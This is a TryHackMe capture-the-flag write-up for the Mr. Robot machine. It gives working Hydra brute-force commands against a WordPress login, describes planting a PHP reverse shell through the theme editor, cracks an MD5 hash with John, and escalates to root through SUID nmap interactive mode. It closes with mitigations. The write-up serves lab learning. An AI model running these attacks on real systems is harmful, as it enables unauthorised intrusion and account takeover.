
# TryHackMe – Mr.Robot CTF Write-Up


Machine Name: Mr. Robot CTF

Difficulty: Medium

Category: Web Exploitation / Brute-Forcing / SUID PrivEsc

IP: 10.130.161.40

Summary:
This machine is heavily themed around the TV show Mr. Robot. The attack path involved discovering a custom wordlist hidden in robots.txt, abusing a WordPress login form to enumerate a valid username, and brute-forcing the password with Hydra. After gaining a reverse shell via the WordPress theme editor, I cracked a raw MD5 hash to pivot to the "robot" user, and finally escalated to root by exploiting an old version of Nmap with SUID privileges.

---------------------------------------------------------------
Recon
---------------------------------------------------------------

Step 1: Nmap Enumeration

I started with a full port scan to identify open services:

`$ nmap -p- -sV -sC -Pn --min-rate 1000 10.130.161.40`

Key Findings:
- 22/tcp: OpenSSH 8.2p1 (Closed/Filtered initially, but present)
- 80/tcp: Apache httpd
- 443/tcp: Apache httpd (SSL)

Step 2: Web Enumeration

Fuzzing the web directory with Gobuster revealed a massive WordPress installation:

`$ gobuster dir -u http://10.130.161.40 -w common.txt`

Notable paths:
- /wp-login.php (WordPress admin portal)
- /license (A taunting message about script kiddies)
- /robots.txt

Step 3: Robots.txt & The First Flag

Checking /robots.txt revealed two highly sensitive files:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

1. Going to http://10.130.161.40/key-1-of-3.txt, revealed the first flag.
2. Going to http://10.130.161.40/fsocity.dic, downloads a custom dictionary/wordlist. I downloaded this list for later use.

---------------------------------------------------------------
Exploitation
---------------------------------------------------------------

Step 4: Username Enumeration

On the WordPress login page (/wp-login.php), entering fake credentials returned: "Invalid username". This meant I could test usernames to see if they exist. 

* *Note:  We can go to burp with intruder and intercept to check how to set up the last part of our string*

Using Hydra, I fed it the fsocity.dic list to find valid users:

`$ hydra -L fsocity.dic -p test 10.130.161.40 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30`

Result:

```
response:
[80][http-post-form] host: 10.130.161.40   login: Elliot   password: test
[80][http-post-form] host: 10.130.161.40   login: elliot   password: test
```

We confirm the presence of the user Elliot.

Step 5: Password Brute-Forcing

Now knowing the username, I flipped the Hydra attack to brute-force the password using the same dictionary:

* *Note: Hydra is **Case sensitive**, Capital letters are for files and lowercase are for strings*

`$ hydra -l elliot -P fsocity.dic 10.130.161.40 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered" -t 30`

With this we cracked the password! Credentials -> elliot : ER28-0652

Step 6: Gaining a Reverse Shell

I logged into the WordPress dashboard, navigated to Appearance -> Editor, and injected a PentestMonkey PHP reverse shell into the archive.php (or 404.php) theme file. By browsing to that file's URL, I caught a reverse shell as the 'daemon' user.

---------------------------------------------------------------
Privilege Escalation
---------------------------------------------------------------

Step 7: Horizontal Pivot (daemon -> robot)

Snooping around the system, in /home/robot, I found the second key (permission denied) and a file named password.raw-md5 containing:
robot:c3fcd3d76192e4007dfb496cca67e13b

I passed this MD5 hash to John the Ripper using the custom wordlist:
$ john --wordlist=fsocity.dic mrrobotmd5.hash --format=Raw-MD5

Result: Cracked the hash -> abcdefghijklmnopqrstuvwxyz

After stabilizing my shell `python -c 'import pty; pty.spawn("/bin/bash")'`, I switched to the robot user:

`$ su robot (Password: abcdefghijklmnopqrstuvwxyz)`

This allowed me to read key-2-of-3.txt.

Step 8: Vertical Escalation (robot -> root)

I searched the system for SUID binaries:
$ find / -perm -u=s -type f 2>/dev/null

One binary stood out: /usr/local/bin/nmap. 
Older versions of Nmap (versions 2.02 to 5.21) have an interactive mode that allows users to execute shell commands. Because Nmap had the SUID bit set, those shell commands executed as root.

Following GTFOBins methodology:
```
$ nmap --interactive
nmap> !sh
# whoami
root
root@ip-10-130-161-40:/# cat key-3-of-3.txt
*************
```

Conclusion:
-
This machine illustrates the dangers of leaving sensitive files exposed in robots.txt and relying on outdated software. The attack chain flowed from OSINT to brute-forcing, password cracking, and exploiting a classic SUID misconfiguration.

Mitigation:
- Web Security: Disable verbose login errors in WordPress to prevent username enumeration.
- Passwords: Enforce strong password policies that resist dictionary attacks.
- System Security: Regularly audit SUID binaries and remove the SUID bit from applications that don't strictly require it (like Nmap).


